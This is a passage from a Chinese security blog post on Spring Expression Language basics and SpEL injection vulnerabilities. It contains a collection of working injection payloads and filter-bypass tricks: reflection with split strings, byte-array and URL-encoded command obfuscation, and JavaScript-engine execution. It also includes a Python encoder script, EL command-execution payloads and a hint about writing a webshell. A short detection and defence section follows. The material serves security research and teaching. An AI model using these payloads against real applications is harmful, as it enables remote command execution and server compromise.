+<h4 id="集合投影"><a href="#集合投影" class="headerlink" title="集合投影"></a>集合投影</h4><blockquote>
+<p>集合投影就是从集合的每一个成员中选择特定的属性放入到一个新的集合中。SpEL的投影运算符<code>.![]</code>完全可以做到这一点。</p>
+<p>例如，我们仅需要包含城市名称的一个String类型的集合：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"cityNames"</span> <span class="attr">value</span>=<span class="string">"#&#123;cities.![name]&#125;"</span>/&gt;</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<blockquote>
+<p>再比如，得到城市名字加州名的集合：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; &lt;property name=&quot;cityNames&quot; value=&quot;#&#123;cities.![name+&apos;,&apos;+state]&#125;&quot;/&gt;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<blockquote>
+<p>把符合条件的城市的名字和州名作为一个新的集合：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"cityNames"</span> <span class="attr">value</span>=<span class="string">"#&#123;cities.?[population gt 100000].![name+','+state]&#125;"</span>/&gt;</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h3 id="变量定义和引用"><a href="#变量定义和引用" class="headerlink" title="变量定义和引用"></a>变量定义和引用</h3><p>在SpEL表达式中，变量定义通过EvaluationContext类的setVariable(variableName, value)函数来实现；在表达式中使用”#variableName”来引用；除了引用自定义变量，SpEL还允许引用根对象及当前上下文对象：</p>
+<ul>
+<li><code>#this</code>：使用当前正在计算的上下文；</li>
+<li><code>#root</code>：引用容器的root对象；</li>
+</ul>
+<p>示例，使用setVariable()函数定义了名为variable的变量，并且通过<code>#variable</code>来引用，同时尝试引用根对象和上下文对象：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ExpressionParser parser = <span class="keyword">new</span> SpelExpressionParser();</span><br><span class="line">EvaluationContext context = <span class="keyword">new</span> StandardEvaluationContext(<span class="string">"mi1k7ea"</span>);</span><br><span class="line">context.setVariable(<span class="string">"variable"</span>, <span class="string">"666"</span>);</span><br><span class="line">String result1 = parser.parseExpression(<span class="string">"#variable"</span>).getValue(context, String.class);</span><br><span class="line">System.out.println(result1);</span><br><span class="line">String result2 = parser.parseExpression(<span class="string">"#root"</span>).getValue(context, String.class);</span><br><span class="line">System.out.println(result2);</span><br><span class="line">String result3 = parser.parseExpression(<span class="string">"#this"</span>).getValue(context, String.class);</span><br><span class="line">System.out.println(result3);</span><br></pre></td></tr></table></figure>
+<p>输出：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">666</span><br><span class="line">mi1k7ea</span><br><span class="line">mi1k7ea</span><br></pre></td></tr></table></figure>
+<h3 id="instanceof-表达式"><a href="#instanceof-表达式" class="headerlink" title="instanceof 表达式"></a>instanceof 表达式</h3><p>SpEL 支持 instanceof 运算符，跟 Java 内使用同义；如”‘haha’ instanceof T(String)”将返回 true。</p>
+<h3 id="自定义函数"><a href="#自定义函数" class="headerlink" title="自定义函数"></a>自定义函数</h3><p>目前只支持类静态方法注册为自定义函数。SpEL使用StandardEvaluationContext的registerFunction方法进行注册自定义函数，其实完全可以使用setVariable代替，两者其实本质是一样的。</p>
+<p>示例，用户自定义实现字符串反转的函数：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mi1k7ea;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserFunc</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">reverseString</span><span class="params">(String input)</span> </span>&#123;</span><br><span class="line">        StringBuilder backwards = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; input.length(); i++) &#123;</span><br><span class="line">            backwards.append(input.charAt(input.length() - <span class="number">1</span> - i));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> backwards.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>通过如下代码将方法注册到StandardEvaluationContext并且来使用它：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ExpressionParser parser = <span class="keyword">new</span> SpelExpressionParser();</span><br><span class="line">StandardEvaluationContext context = <span class="keyword">new</span> StandardEvaluationContext();</span><br><span class="line">context.registerFunction(<span class="string">"reverseString"</span>, UserFunc.class.getDeclaredMethod(<span class="string">"reverseString"</span>, <span class="keyword">new</span> Class[] &#123; String.class &#125;));</span><br><span class="line">String helloWorldReversed = parser.parseExpression(<span class="string">"#reverseString('mi1k7ea')"</span>).getValue(context, String.class);</span><br><span class="line">System.out.println(helloWorldReversed);</span><br></pre></td></tr></table></figure>
+<p>输出反转的字符串<code>ae7k1im</code>。</p>
+<h2 id="0x02-SpEL表达式注入漏洞"><a href="#0x02-SpEL表达式注入漏洞" class="headerlink" title="0x02 SpEL表达式注入漏洞"></a>0x02 SpEL表达式注入漏洞</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>SimpleEvaluationContext和StandardEvaluationContext是SpEL提供的两个EvaluationContext：</p>
+<ul>
+<li>SimpleEvaluationContext - 针对不需要SpEL语言语法的全部范围并且应该受到有意限制的表达式类别，公开SpEL语言特性和配置选项的子集。</li>
+<li>StandardEvaluationContext - 公开全套SpEL语言功能和配置选项。您可以使用它来指定默认的根对象并配置每个可用的评估相关策略。</li>
+</ul>
+<p>SimpleEvaluationContext旨在仅支持SpEL语言语法的一个子集，不包括 Java类型引用、构造函数和bean引用；而StandardEvaluationContext是支持全部SpEL语法的。</p>
+<p>由前面知道，SpEL表达式是可以操作类及其方法的，可以通过类类型表达式T(Type)来调用任意类方法。这是因为在不指定EvaluationContext的情况下默认采用的是StandardEvaluationContext，而它包含了SpEL的所有功能，在允许用户控制输入的情况下可以成功造成任意命令执行。</p>
+<p>如下，前面的例子中已提过：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mi1k7ea;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.Expression;</span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.ExpressionParser;</span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.spel.standard.SpelExpressionParser;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainApp</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String spel = <span class="string">"T(java.lang.Runtime).getRuntime().exec(\"calc\")"</span>;</span><br><span class="line">        ExpressionParser parser = <span class="keyword">new</span> SpelExpressionParser();</span><br><span class="line">        Expression expression = parser.parseExpression(spel);</span><br><span class="line">        System.out.println(expression.getValue());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>运行弹计算器：</p>
+<p><img src="/2020/01/10/SpEL表达式注入漏洞总结/1.png" alt=""></p>
+<h3 id="PoC-amp-Bypass整理"><a href="#PoC-amp-Bypass整理" class="headerlink" title="PoC&amp;Bypass整理"></a>PoC&amp;Bypass整理</h3><p>下面我们来整理下各种利用的PoC，这里默认把定界符<code>#{}</code>去掉。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">// PoC原型</span><br><span class="line"></span><br><span class="line">// Runtime</span><br><span class="line">T(java.lang.Runtime).getRuntime().exec(&quot;calc&quot;)</span><br><span class="line">T(Runtime).getRuntime().exec(&quot;calc&quot;)</span><br><span class="line"></span><br><span class="line">// ProcessBuilder</span><br><span class="line">new java.lang.ProcessBuilder(&#123;&apos;calc&apos;&#125;).start()</span><br><span class="line">new ProcessBuilder(&#123;&apos;calc&apos;&#125;).start()</span><br><span class="line"></span><br><span class="line">******************************************************************************</span><br><span class="line">// Bypass技巧</span><br><span class="line"></span><br><span class="line">// 反射调用</span><br><span class="line">T(String).getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;calc&quot;)</span><br><span class="line"></span><br><span class="line">// 同上，需要有上下文环境</span><br><span class="line">#this.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;calc&quot;)</span><br><span class="line"></span><br><span class="line">// 反射调用+字符串拼接，绕过如javacon题目中的正则过滤</span><br><span class="line">T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;ex&quot;+&quot;ec&quot;,T(String[])).invoke(T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;getRu&quot;+&quot;ntime&quot;).invoke(T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;)),new String[]&#123;&quot;cmd&quot;,&quot;/C&quot;,&quot;calc&quot;&#125;)</span><br><span class="line"></span><br><span class="line">// 同上，需要有上下文环境</span><br><span class="line">#this.getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;ex&quot;+&quot;ec&quot;,T(String[])).invoke(T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;getRu&quot;+&quot;ntime&quot;).invoke(T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;)),new String[]&#123;&quot;cmd&quot;,&quot;/C&quot;,&quot;calc&quot;&#125;)</span><br><span class="line"></span><br><span class="line">// 当执行的系统命令被过滤或者被URL编码掉时，可以通过String类动态生成字符，Part1</span><br><span class="line">// byte数组内容的生成后面有脚本</span><br><span class="line">new java.lang.ProcessBuilder(new java.lang.String(new byte[]&#123;99,97,108,99&#125;)).start()</span><br><span class="line"></span><br><span class="line">// 当执行的系统命令被过滤或者被URL编码掉时，可以通过String类动态生成字符，Part2</span><br><span class="line">// byte数组内容的生成后面有脚本</span><br><span class="line">T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(99)))</span><br><span class="line"></span><br><span class="line">// JavaScript引擎通用PoC</span><br><span class="line">T(javax.script.ScriptEngineManager).newInstance().getEngineByName(&quot;nashorn&quot;).eval(&quot;s=[3];s[0]=&apos;cmd&apos;;s[1]=&apos;/C&apos;;s[2]=&apos;calc&apos;;java.la&quot;+&quot;ng.Run&quot;+&quot;time.getRu&quot;+&quot;ntime().ex&quot;+&quot;ec(s);&quot;)</span><br><span class="line"></span><br><span class="line">T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName(&quot;JavaScript&quot;).eval(&quot;xxx&quot;),)</span><br><span class="line"></span><br><span class="line">// JavaScript引擎+反射调用</span><br><span class="line">T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName(&quot;JavaScript&quot;).eval(T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;ex&quot;+&quot;ec&quot;,T(String[])).invoke(T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;getRu&quot;+&quot;ntime&quot;).invoke(T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;)),new String[]&#123;&quot;cmd&quot;,&quot;/C&quot;,&quot;calc&quot;&#125;)),)</span><br><span class="line"></span><br><span class="line">// JavaScript引擎+URL编码</span><br><span class="line">// 其中URL编码内容为：</span><br><span class="line">// 不加最后的getInputStream()也行，因为弹计算器不需要回显</span><br><span class="line">T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName(&quot;JavaScript&quot;).eval(T(java.net.URLDecoder).decode(&quot;%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%63%61%6c%63%22%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29&quot;)),)</span><br><span class="line"></span><br><span class="line">// 黑名单过滤&quot;.getClass(&quot;，可利用数组的方式绕过，还未测试成功</span><br><span class="line">&apos;&apos;[&apos;class&apos;].forName(&apos;java.lang.Runtime&apos;).getDeclaredMethods()[15].invoke(&apos;&apos;[&apos;class&apos;].forName(&apos;java.lang.Runtime&apos;).getDeclaredMethods()[7].invoke(null),&apos;calc&apos;)</span><br><span class="line"></span><br><span class="line">// JDK9新增的shell，还未测试</span><br><span class="line">T(SomeWhitelistedClassNotPartOfJDK).ClassLoader.loadClass(&quot;jdk.jshell.JShell&quot;,true).Methods[6].invoke(null,&#123;&#125;).eval(&apos;whatever java code in one statement&apos;).toString()</span><br></pre></td></tr></table></figure>
+<p>CreateAscii.py，用于String类动态生成字符的字符ASCII码转换生成：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">message = input(<span class="string">'Enter message to encode:'</span>)</span><br><span class="line"> </span><br><span class="line">print(<span class="string">'Decoded string (in ASCII):\n'</span>)</span><br><span class="line"> </span><br><span class="line">print(<span class="string">'T(java.lang.Character).toString(%s)'</span> % ord(message[<span class="number">0</span>]), end=<span class="string">""</span>)</span><br><span class="line"><span class="keyword">for</span> ch <span class="keyword">in</span> message[<span class="number">1</span>:]:</span><br><span class="line">   print(<span class="string">'.concat(T(java.lang.Character).toString(%s))'</span> % ord(ch), end=<span class="string">""</span>), </span><br><span class="line">print(<span class="string">'\n'</span>)</span><br><span class="line"> </span><br><span class="line">print(<span class="string">'new java.lang.String(new byte[]&#123;'</span>, end=<span class="string">""</span>),</span><br><span class="line">print(ord(message[<span class="number">0</span>]), end=<span class="string">""</span>)</span><br><span class="line"><span class="keyword">for</span> ch <span class="keyword">in</span> message[<span class="number">1</span>:]:</span><br><span class="line">   print(<span class="string">',%s'</span> % ord(ch), end=<span class="string">""</span>), </span><br><span class="line">print(<span class="string">')&#125;'</span>)</span><br></pre></td></tr></table></figure>
+<p>其他的一些payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">// 转自：https://www.jianshu.com/p/ce4ac733a4b9</span><br><span class="line"></span><br><span class="line">$&#123;pageContext&#125; 对应于JSP页面中的pageContext对象（注意：取的是pageContext对象。）</span><br><span class="line"></span><br><span class="line">$&#123;pageContext.getSession().getServletContext().getClassLoader().getResource(&quot;&quot;)&#125;   获取web路径</span><br><span class="line"></span><br><span class="line">$&#123;header&#125;  文件头参数</span><br><span class="line"></span><br><span class="line">$&#123;applicationScope&#125; 获取webRoot</span><br><span class="line"></span><br><span class="line">$&#123;pageContext.request.getSession().setAttribute(&quot;a&quot;,pageContext.request.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec(&quot;命令&quot;).getInputStream())&#125;  执行命令</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// 渗透思路：获取webroot路径，exec执行命令echo写入一句话。</span><br><span class="line"></span><br><span class="line">&lt;p th:text=&quot;$&#123;#this.getClass().forName(&apos;java.lang.System&apos;).getProperty(&apos;user.dir&apos;)&#125;&quot;&gt;&lt;/p&gt;   //获取web路径</span><br></pre></td></tr></table></figure>
+<h2 id="0x03-检测与防御"><a href="#0x03-检测与防御" class="headerlink" title="0x03 检测与防御"></a>0x03 检测与防御</h2><h3 id="检测方法"><a href="#检测方法" class="headerlink" title="检测方法"></a>检测方法</h3><p>全局搜索关键特征：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//关键类</span></span><br><span class="line">org.springframework.expression.Expression</span><br><span class="line">org.springframework.expression.ExpressionParser</span><br><span class="line">org.springframework.expression.spel.standard.SpelExpressionParser</span><br><span class="line"></span><br><span class="line"><span class="comment">//调用特征</span></span><br><span class="line">ExpressionParser parser = <span class="keyword">new</span> SpelExpressionParser();</span><br><span class="line">Expression expression = parser.parseExpression(str);</span><br><span class="line">expression.getValue()</span><br><span class="line">expression.setValue()</span><br></pre></td></tr></table></figure>
+<h3 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h3><p>最直接的修复方法是使用SimpleEvaluationContext替换StandardEvaluationContext。</p>
+<p>官方文档：<a href="https://docs.spring.io/spring/docs/5.0.6.RELEASE/javadoc-api/org/springframework/expression/spel/support/SimpleEvaluationContext.html" target="_blank" rel="noopener">https://docs.spring.io/spring/docs/5.0.6.RELEASE/javadoc-api/org/springframework/expression/spel/support/SimpleEvaluationContext.html</a></p>
+<p>Demo：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">String spel = <span class="string">"T(java.lang.Runtime).getRuntime().exec(\"calc\")"</span>;</span><br><span class="line">ExpressionParser parser = <span class="keyword">new</span> SpelExpressionParser();</span><br><span class="line">Student student = <span class="keyword">new</span> Student();</span><br><span class="line">EvaluationContext context = SimpleEvaluationContext.forReadOnlyDataBinding().withRootObject(student).build();</span><br><span class="line">Expression expression = parser.parseExpression(spel);</span><br><span class="line">System.out.println(expression.getValue(context));</span><br></pre></td></tr></table></figure>
+<h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p><a href="http://rui0.cn/archives/1043" target="_blank" rel="noopener">由浅入深SpEL表达式注入漏洞</a></p>
+<p><a href="https://mrbird.cc/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F.html" target="_blank" rel="noopener">SpEL表达式</a></p>
+
+    </div>
+
+  </article>
+  <div class="toc-container">
+    
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-SpEL表达式基础"><span class="toc-text">0x01 SpEL表达式基础</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SpEL简介"><span class="toc-text">SpEL简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SpEL定界符——"><span class="toc-text">SpEL定界符——#{}</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SpEL表达式类型"><span class="toc-text">SpEL表达式类型</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#字面值"><span class="toc-text">字面值</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Demo"><span class="toc-text">Demo</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#引用Bean、属性和方法"><span class="toc-text">引用Bean、属性和方法</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#引用Bean"><span class="toc-text">引用Bean</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#引用类属性"><span class="toc-text">引用类属性</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#引用类方法"><span class="toc-text">引用类方法</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Demo——引用Bean"><span class="toc-text">Demo——引用Bean</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#类类型表达式T-Type"><span class="toc-text">类类型表达式T(Type)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Demo-1"><span class="toc-text">Demo</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#恶意利用——弹计算器"><span class="toc-text">恶意利用——弹计算器</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SpEL用法"><span class="toc-text">SpEL用法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Expression用法"><span class="toc-text">Expression用法</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#步骤"><span class="toc-text">步骤</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#主要接口"><span class="toc-text">主要接口</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Demo-2"><span class="toc-text">Demo</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#类实例化"><span class="toc-text">类实例化</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SpEL表达式运算"><span class="toc-text">SpEL表达式运算</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#算数运算"><span class="toc-text">算数运算</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#关系运算"><span class="toc-text">关系运算</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#逻辑运算"><span class="toc-text">逻辑运算</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#条件运算"><span class="toc-text">条件运算</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#正则表达式"><span class="toc-text">正则表达式</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#集合操作"><span class="toc-text">集合操作</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#访问集合成员"><span class="toc-text">访问集合成员</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#查询集合成员"><span class="toc-text">查询集合成员</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#集合投影"><span class="toc-text">集合投影</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#变量定义和引用"><span class="toc-text">变量定义和引用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#instanceof-表达式"><span class="toc-text">instanceof 表达式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#自定义函数"><span class="toc-text">自定义函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-SpEL表达式注入漏洞"><span class="toc-text">0x02 SpEL表达式注入漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞原理"><span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PoC-amp-Bypass整理"><span class="toc-text">PoC&amp;Bypass整理</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-检测与防御"><span class="toc-text">0x03 检测与防御</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#检测方法"><span class="toc-text">检测方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#防御方法"><span class="toc-text">防御方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-参考"><span class="toc-text">0x04 参考</span></a></li></ol>
+  </div>
+
+
+  </div>
+</div>
+<div class="copyright">
+    <span>本作品采用</span>
+    <a href="https://creativecommons.org/licenses/by/4.0/">知识共享署名 4.0 国际许可协议</a>
+    <span>进行许可。 转载时请注明原文链接。</span>
+</div>
+
+
+  
+    <div class="post-nav">
+      <div class="post-nav-item post-nav-next">
+        
+          <span>〈 </span>
+          <a href="/2020/01/04/浅析XSSI漏洞/" rel="next" title="浅析XSSI漏洞">
+          浅析XSSI漏洞
+          </a>
+        
+      </div>
+  
+      <div class="post-nav-item post-nav-prev">
+          
+          <a href="/2020/01/16/Spring-MVC笔记/" rel="prev" title="Spring MVC笔记">
+            Spring MVC笔记
+          </a>
+          <span>〉</span>
+        
+      </div>
+    </div>
+  
+
+
+    </div>
+
+    
+    
+
+  </div>
+  <footer class="footer text-center">
+    <div id="bottom-inner">
+        <span>Copyright &copy; Mi1k7ea</span>  |  
+        <span id="busuanzi_container_site_pv">总访问量 <span id="busuanzi_value_site_pv"></span></span> | 
+        <span id="busuanzi_container_site_uv">访客 <span id="busuanzi_value_site_uv"></span></span>
+    </div>
+</footer>
+
+  
+
+<script>
+  (function(window, document, undefined) {
+
+    var timer = null;
+
+    function returnTop() {
+      cancelAnimationFrame(timer);
+      timer = requestAnimationFrame(function fn() {
+        var oTop = document.body.scrollTop || document.documentElement.scrollTop;
+        if (oTop > 0) {
+          document.body.scrollTop = document.documentElement.scrollTop = oTop - 50;
+          timer = requestAnimationFrame(fn);
+        } else {
+          cancelAnimationFrame(timer);
+        }
+      });
+    }
+
+    var hearts = [];
+    window.requestAnimationFrame = (function() {
+      return window.requestAnimationFrame ||
+        window.webkitRequestAnimationFrame ||
+        window.mozRequestAnimationFrame ||
+        window.oRequestAnimationFrame ||
+        window.msRequestAnimationFrame ||
+        function(callback) {
+          setTimeout(callback, 1000 / 60);
+        }
+    })();
+    init();
+
+    function init() {
+      css(".heart{z-index:9999;width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);}.heart:after,.heart:before{content: '';width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: absolute;}.heart:after{top: -5px;}.heart:before{left: -5px;}");
+      attachEvent();
+      gameloop();
+      addMenuEvent();
+    }
+
+    function gameloop() {
+      for (var i = 0; i < hearts.length; i++) {
+        if (hearts[i].alpha <= 0) {
+          document.body.removeChild(hearts[i].el);
+          hearts.splice(i, 1);
+          continue;
+        }
+        hearts[i].y--;
+        hearts[i].scale += 0.004;
+        hearts[i].alpha -= 0.013;
+        hearts[i].el.style.cssText = "left:" + hearts[i].x + "px;top:" + hearts[i].y + "px;opacity:" + hearts[i].alpha + ";transform:scale(" + hearts[i].scale + "," + hearts[i].scale + ") rotate(45deg);background:" + hearts[i].color;
+      }
+      requestAnimationFrame(gameloop);
+    }
+
+    /**
+     * 给logo设置点击事件
+     * 
+     * - 回到顶部
+     * - 出现爱心
+     */
+    function attachEvent() {
+      var old = typeof window.onclick === "function" && window.onclick;
+      var logo = document.getElementById("logo");
+      if (logo) {
+        logo.onclick = function(event) {
+          returnTop();
